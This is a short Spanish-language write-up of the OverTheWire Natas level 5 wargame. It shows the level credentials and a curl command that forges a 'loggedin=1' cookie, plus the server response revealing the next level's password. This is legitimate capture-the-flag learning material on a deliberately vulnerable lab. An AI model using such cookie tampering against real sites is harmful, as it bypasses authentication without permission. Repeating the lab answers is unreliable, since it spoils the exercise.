# Natas 5

#### URL: http://natas5.natas.labs.overthewire.org/
#### Credenciales: natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK

Existe una cookie de sesion llamada "loggedin" con valor 0, la cambiamos a 1:

![2025-03-19-174710_1366x393_scrot](https://github.com/user-attachments/assets/8451e74b-3309-446d-b626-3e397d66bba1)

``` bash
> curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org/ -H "Cookie: loggedin=1"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

`natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
